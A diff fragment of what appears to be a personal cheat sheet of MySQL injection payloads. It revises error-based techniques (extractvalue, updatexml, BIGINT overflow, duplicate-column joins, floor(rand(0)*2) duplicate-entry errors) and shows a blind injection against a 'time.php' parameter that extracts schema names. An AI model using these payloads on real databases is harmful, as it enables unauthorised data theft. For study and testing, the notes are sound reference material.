@@ -14,11 +14,13 @@ time.php?feedback=1' %2B%0A if((select ascii(substring((select schema_name from 
 select ~0+1;
 select 18446744073709551615 + (select version() != 1);
 
-select extractvalue(1,concat(0x7e,(select @@version),0x7e));
-select updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1);
+select extractvalue(1,concat(0x7e,(select version())));
+select updatexml(1,concat(0x7e,(SELECT version())),1);
+
 select *  from(select * from feedback a join feedback b)c;
 select *  from(select * from test a join test b using(id))c;
-select count(*),(select concat(floor(rand(0)*2),'@',(select version())))x from feedback group by x;
+
+select count(*) from feedback group by concat(version(),floor(rand(0)*2));
 
 # Note
 1062 - is when you attempt to insert a row which results in a duplicated entry, it doesn't matter which type of key (primary, unique, etc).
